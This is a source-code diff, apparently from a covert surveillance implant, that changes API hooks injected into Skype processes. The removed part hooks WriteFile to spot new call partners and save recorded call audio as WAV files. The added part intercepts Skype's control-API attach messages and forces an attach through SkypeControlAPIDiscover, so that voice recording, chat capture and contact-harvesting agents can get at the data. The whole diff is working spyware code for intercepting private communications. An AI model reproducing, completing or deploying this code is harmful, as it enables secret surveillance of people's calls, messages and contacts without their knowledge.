@@ -76,7 +76,7 @@ typedef struct _VoiceAdditionalData {
 #define FLAGS_SKAPI_MSG 8    // Messaggio delle api di Skype
 #define FLAGS_SKAPI_WND 16   // Messaggio delle api di Skype (thread di dispatch)
 #define FLAGS_SKAPI_SWD 32   // Messaggio delle api di Skype
-#define FLAGS_SKAPI_USR 64   // Messaggio di Skype: nuovo utente (con metodo writefile)
+#define FLAGS_SKAPI_ATT 64   // Messaggio di Skype: Segnala il core che deve fare l'attach per inviare messaggi
 
 #define FLAGS_YMSG_IN  128	// Messaggio delle api di YahooMessenger
 #define FLAGS_YMSG_OUT 256	// Messaggio delle api di YahooMessenger
@@ -1232,99 +1232,6 @@ DWORD PM_waveInUnprepareHeader_setup(HMServiceStruct *pData)
 
 ///////////////////////////
 //
-//   WriteFile
-//
-///////////////////////////
-
-typedef struct {
-	COMMONDATA;
-} WriteFileStruct;
-
-WriteFileStruct WriteFileData;
-
-BOOL  __stdcall PM_WriteFile(HANDLE ARG1,
-                             BYTE *buffer,
-					  		 DWORD buf_len,
-							 LPDWORD ARG4,
-                             LPOVERLAPPED ARG5)
-{
-	DWORD i;
-	DWORD string_len;
-	BOOL *Active;
-
-	MARK_HOOK
-
-	INIT_WRAPPER(WriteFileStruct)
-	CALL_ORIGINAL_API(5)
-
-	// Parsa la struttura per vedere se e' una scrittura di nuova 
-	// chiamata effettuata nel file di log chiamate
-	if (buf_len < 12)
-		return (BOOL)ret_code;
-	if (buffer[4]!=0x41 || buffer[6]!=0x00 || buffer[7]!=0x09 ||
-		buffer[8]!=0x0D || buffer[9]!=0x03 || buffer[10]!=0x98 || buffer[11]!=0x07)
-		return (BOOL)ret_code;
-
-	// Se il processo non e' skype o qualcosa e' andato storto, ritorna
-	if(!((DWORD)pData->pHM_IpcCliWrite) || !ret_code)
-		return (BOOL)ret_code;
-
-	// Controlla se il monitor e' attivo
-	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
-	if (!Active || !(*Active))
-		return (BOOL)ret_code;
-
-	// Verifica che la stringa sia contenuta tutta nel buffer
-	i=12; string_len=1; 
-	LOOP {
-		// Se siamo usciti fuori dal buffer senza trovare il NULL terminate
-		// (controlla anche che non scriviamo troppo nel buffer locale...
-		// ...tanto MAX_ID_LEN e' molto minore di MAX_MSG_LEN
-		if (i >= buf_len || string_len >= MAX_ID_LEN)
-			return (BOOL)ret_code;
-
-		// Se abbiamo raggiunto il NULL
-		if (buffer[i] == 0)
-			break;
-		
-		i++; string_len++;
-	}
-
-	// Cosi' siamo sicuri che il nome sia NULL terminato
-	pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, &buffer[12], string_len, FLAGS_SKAPI_USR, IPC_HI_PRIORITY);
-
-	return (BOOL)ret_code;
-}
-
-
-DWORD PM_WriteFile_setup(HMServiceStruct *pData)
-{
-	char proc_path[DLLNAMELEN];
-	char *proc_name;
-	HMODULE hMod;
-
-	// Verifica autonomamente se si tratta del processo skype
-	ZeroMemory(proc_path, sizeof(proc_path));
-	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
-	proc_name = strrchr(proc_path, '\\');
-	if (proc_name) {
-		proc_name++;
-		if (stricmp(proc_name, "skype.exe") || IsSkypePMInstalled())
-			return 1; // Hooka solo skype.exe e solo se NON c'e' SkypePM
-	} else
-		return 1;
-
-	WriteFileData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
-	WriteFileData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
-	WriteFileData.dwHookLen = 870;
-	return 0;
-}
-
-
-
-
-///////////////////////////
-//
 //   SendMessageTimeOut
 //
 ///////////////////////////
@@ -1344,6 +1251,8 @@ typedef struct {
 	HWND cn_skapi_swd;
 
 	BOOL is_skypepm;
+	BOOL is_spm_installed;
+	UINT attach_msg;
 } SendMessageStruct;
 SendMessageStruct SendMessageData;
 
@@ -1374,10 +1283,41 @@ LRESULT __stdcall PM_SendMessage(  HWND hWnd,
 	if (!(*Active_VOIP) && !(*Active_IM) && !(*Active_Contacts))
 		return ret_code;
 
-	if (Msg != WM_COPYDATA || !(pData->pHM_IpcCliWrite)) 
+	if (!pData->pHM_IpcCliWrite) 
 		return ret_code;
 	cdata = (COPYDATASTRUCT *)lParam;
 	msg_body = (BYTE *)cdata->lpData;
+
+	// Skype ha dato l'ok per l'attach. Notifico i processi per poter mandare i messaggi delle api 
+	if (!pData->is_spm_installed && !pData->is_skypepm && Msg==pData->attach_msg && wParam!=NULL) {
+		if ((*Active_VOIP)) {
+			if (pData->voip_skapi_swd != hWnd  || pData->voip_skapi_wnd != (HWND)wParam) {
+				pData->voip_skapi_swd = hWnd;
+				pData->voip_skapi_wnd = (HWND)wParam;
+				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(&pData->voip_skapi_wnd), sizeof(DWORD), FLAGS_SKAPI_WND, IPC_HI_PRIORITY);
+				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(&pData->voip_skapi_swd), sizeof(DWORD), FLAGS_SKAPI_SWD, IPC_HI_PRIORITY);
+			}
+		}
+		if ((*Active_IM)) {
+			if (pData->im_skapi_swd != hWnd  || pData->im_skapi_wnd != (HWND)wParam) {
+				pData->im_skapi_swd = hWnd;
+				pData->im_skapi_wnd = (HWND)wParam;
+				pData->pHM_IpcCliWrite(PM_IMAGENT, (BYTE *)(&pData->im_skapi_wnd), sizeof(DWORD), FLAGS_SKAPI_WND, IPC_HI_PRIORITY);
+				pData->pHM_IpcCliWrite(PM_IMAGENT, (BYTE *)(&pData->im_skapi_swd), sizeof(DWORD), FLAGS_SKAPI_SWD, IPC_HI_PRIORITY);
+			}
+		}
+		if ((*Active_Contacts)) {
+			if (pData->cn_skapi_swd != hWnd  || pData->cn_skapi_wnd != (HWND)wParam) {
+				pData->cn_skapi_swd = hWnd;
+				pData->cn_skapi_wnd = (HWND)wParam;
+				pData->pHM_IpcCliWrite(PM_CONTACTSAGENT, (BYTE *)(&pData->cn_skapi_wnd), sizeof(DWORD), FLAGS_SKAPI_WND, IPC_HI_PRIORITY);
+				pData->pHM_IpcCliWrite(PM_CONTACTSAGENT, (BYTE *)(&pData->cn_skapi_swd), sizeof(DWORD), FLAGS_SKAPI_SWD, IPC_HI_PRIORITY);
+			}
+		}
+	}
+	
+	if (Msg != WM_COPYDATA)
+		return ret_code;
 
 	if (pData->is_skypepm) {
 		if ((*Active_VOIP)) {
@@ -1411,14 +1351,26 @@ LRESULT __stdcall PM_SendMessage(  HWND hWnd,
 			if (!pData->voip_is_sent) {
 				pData->voip_is_sent = TRUE;
 				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(&ret_code), sizeof(DWORD), FLAGS_SKAPI_INI, IPC_HI_PRIORITY);
+				if (!pData->is_spm_installed)
+					pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(&ret_code), sizeof(DWORD), FLAGS_SKAPI_ATT, IPC_HI_PRIORITY);
 			}
 		}
 		if ((*Active_IM)) {
 			if (!pData->im_is_sent) {
 				pData->im_is_sent = TRUE;
 				pData->pHM_IpcCliWrite(PM_IMAGENT, (BYTE *)(&ret_code), sizeof(DWORD), FLAGS_SKAPI_INI, IPC_HI_PRIORITY);
+				if (!pData->is_spm_installed)
+					pData->pHM_IpcCliWrite(PM_IMAGENT, (BYTE *)(&ret_code), sizeof(DWORD), FLAGS_SKAPI_ATT, IPC_HI_PRIORITY);
 			}
 		}
+		if ((*Active_Contacts)) {
+			if (!pData->cn_is_sent) {
+				pData->cn_is_sent = TRUE;
+				if (!pData->is_spm_installed)
+					pData->pHM_IpcCliWrite(PM_CONTACTSAGENT, (BYTE *)(&ret_code), sizeof(DWORD), FLAGS_SKAPI_ATT, IPC_HI_PRIORITY);
+			}
+		}
+
 		if (cdata->cbData <= 4)
 			return ret_code;
 
@@ -1465,10 +1417,15 @@ DWORD PM_SendMessage_setup(HMServiceStruct *pData)
 		SendMessageData.is_skypepm = FALSE;
 		if (!stricmp(proc_name, "skypepm.exe")) {
 			SendMessageData.is_skypepm = TRUE; // siamo in skypepm
-		} else if (stricmp(proc_name, "skype.exe") || !IsSkypePMInstalled()) 
-			return 1; // Se non siamo in skype o non e' installato SkypePM non mette l'hook sulla sendmessage
+		} else if (stricmp(proc_name, "skype.exe")) 
+			return 1; // Se non siamo in skype  non mette l'hook sulla sendmessage
 	} else
 		return 1;
+
+	if (IsSkypePMInstalled())
+		SendMessageData.is_spm_installed = TRUE;
+	else
+		SendMessageData.is_spm_installed = FALSE;
 
 	SendMessageData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
 	SendMessageData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
@@ -1478,8 +1435,12 @@ DWORD PM_SendMessage_setup(HMServiceStruct *pData)
 	SendMessageData.im_is_sent = FALSE;
 	SendMessageData.im_skapi_wnd = 0;
 	SendMessageData.im_skapi_swd = 0;
+	SendMessageData.cn_is_sent = FALSE;
+	SendMessageData.cn_skapi_wnd = 0;
+	SendMessageData.cn_skapi_swd = 0;
+	SendMessageData.attach_msg = RegisterWindowMessage("SkypeControlAPIAttach");
 
-	SendMessageData.dwHookLen = 1950;
+	SendMessageData.dwHookLen = 2650;
 	return 0;
 }
 
@@ -2319,28 +2280,14 @@ BOOL ParseSkypeMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 		return TRUE;
 	}
 
-	if (*pdwFlags & FLAGS_SKAPI_USR) { 
-		// Nuovo utente (trovato col vecchio metodo)
-		DWORD i;
-		pVoiceAdditionalData additional_data;
-		DWORD additional_len;
-		for (i=0; i<2; i++) {
-			if (sample_size[i]>0) {
-				// Non mettiamo la EndCall perche' viene triggerato anche quando l'utente chiude la telefonata
-				// e non vogliamo far comparire una chiamata solo col trillo di chiusura. Quindi non mettiamo
-				// i chunk di chiusura
-				additional_data = VoipGetAdditionalData(call_list_head, i, &additional_len);
-				SaveWav(wave_array[i], sample_size[i], sample_channels[i], additional_data, additional_len);
-				sample_size[i] = 0;
-			}
-		}
-		FreePartnerList(&call_list_head);
-		// Alloca il nuovo interlocutore
-		if ( (call_list_head = (partner_entry *)calloc(sizeof(partner_entry), 1)) )  {
-			//Log_Sanitize((char *)msg);
-			call_list_head->peer = strdup((char *)msg);
-			call_list_head->voip_program = VOIP_SKYPE;
-		}
+	if (*pdwFlags & FLAGS_SKAPI_ATT) {
+		// Deve mandare il messaggio per il discovery
+		UINT msg_type = RegisterWindowMessage("SkypeControlAPIDiscover");
+		HWND skype_wnd = HM_GetProcessWindow("skype.exe");
+		if (skype_wnd == NULL || msg_type == 0)
+			return TRUE;
+		HM_SafeSendMessageTimeoutW(HWND_BROADCAST, msg_type, (WPARAM)skype_wnd, (LPARAM)NULL, SMTO_NORMAL, 500, NULL);
+
 		return TRUE;
 	}
 
